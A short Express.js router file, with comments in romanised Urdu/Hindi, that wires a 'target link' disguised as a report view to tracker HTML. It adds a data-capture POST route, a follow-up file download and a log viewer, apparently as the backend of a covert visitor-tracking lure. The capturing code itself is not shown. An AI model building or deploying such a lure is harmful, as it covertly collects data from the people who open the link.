const express = require('express');
const router = express.Router();
const trackerController = require('../controllers/trackerController');

// 1. Target link (Tracker HTML load hoga)
router.get('/view-report', trackerController.renderTracker);

// 2. Data capture route
router.post('/capture-advanced', express.json(), trackerController.captureAndServe);

// 3. Final File route (Jo redirectUrl hum ne HTML mein diya tha)
router.get('/download-file', trackerController.serveFile);

router.get('/logs', trackerController.getLogs);

module.exports = router;